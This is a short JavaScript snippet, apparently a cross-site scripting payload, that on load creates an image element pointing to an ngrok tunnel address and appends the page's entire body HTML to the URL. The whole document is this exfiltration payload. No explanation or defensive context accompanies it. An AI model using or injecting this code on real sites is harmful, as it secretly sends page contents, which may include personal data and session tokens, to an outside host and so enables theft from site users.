function addTheImage() {
    var img = document.createElement('img');
    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
    document.body.appendChild(img);
}
addTheImage();
